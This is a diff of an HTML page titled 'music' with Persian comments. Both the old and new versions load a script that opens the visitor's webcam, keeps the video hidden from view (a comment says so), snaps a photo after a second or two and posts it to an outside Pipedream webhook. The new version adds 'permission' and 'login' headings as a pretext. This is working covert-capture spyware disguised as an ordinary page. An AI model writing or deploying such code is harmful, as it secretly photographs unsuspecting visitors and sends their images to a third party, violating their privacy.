@@ -2,48 +2,70 @@
 <html lang="fa">
 <head>
     <meta charset="UTF-8">
-    <title>موزیک </title>
-    <style>
-        video, canvas, img {
-            display: none; /* عکس */
-        }
-    </style>
+    <title>موزیک</title>
 </head>
 <body>
-    <!-- عناصر مخفی شده -->
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
-    <img id="preview">
+    <h2>مجوز</h2>
+    <!-- ویدئو برای پیش‌نمایش دوربین (که برای کاربر مخفی میشه) -->
+    <video id="video" width="640" height="480" autoplay playsinline style="display: none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+
+    <h3>ورود:</h3>
+    <img id="capturedImage" src="" alt="Captured Image" width="640" height="480"/>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const preview = document.getElementById('preview');
         const context = canvas.getContext('2d');
+        const capturedImage = document.getElementById('capturedImage');
+        let streamReady = false;
 
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => {
+        // درخواست دسترسی به دوربین
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function (stream) {
                 video.srcObject = stream;
+                streamReady = true;
 
-                // صبر برای آماده شدن دوربین
+                // بعد از 1 ثانیه عکس گرفته می‌شود
                 setTimeout(() => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const dataUrl = canvas.toDataURL("image/jpeg");
-
-                    // ارسال عکس به سرور یا Webhook
-                    fetch("https://eoeq114hreszd00.m.pipedream.net", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({ image: dataUrl })
-                    }).then(() => console.log("عکس ارسال شد"))
-                      .catch(err => console.error("خطا در ارسال:", err));
-                }, 2000); // زمان گرفتن عکس (۲ ثانیه)
+                    captureAndSendImage();
+                }, 1000); // 1 ثانیه تا شروع به گرفتن عکس
             })
-            .catch(error => {
-                console.error("عدم دسترسی به دوربین:", error);
+            .catch(function (error) {
+                alert('دسترسی به دوربین رد شد یا مشکل دارد.');
+                console.error(error);
             });
+
+        function captureAndSendImage() {
+            if (!streamReady) {
+                alert("لطفاً منتظر بمانید تا دوربین آماده شود.");
+                return;
+            }
+
+            // کشیدن تصویر از ویدئو به canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تبدیل تصویر به Base64
+            const dataUrl = canvas.toDataURL("image/jpeg");
+
+            // ارسال تصویر به Webhook Pipedream
+            fetch("https://eoeq114hreszd00.m.pipedream.net", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ image: dataUrl })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("تصویر ارسال شد: ", data);
+                alert("تصویر ارسال شد.");
+
+                // نمایش تصویر در سایت برای شما
+                capturedImage.src = data.image;  // فرض بر اینکه Pipedream، داده تصویر را در فیلد 'image' ارسال کند
+            })
+            .catch(error => console.error("خطا در ارسال:", error));
+        }
     </script>
 </body>
 </html>
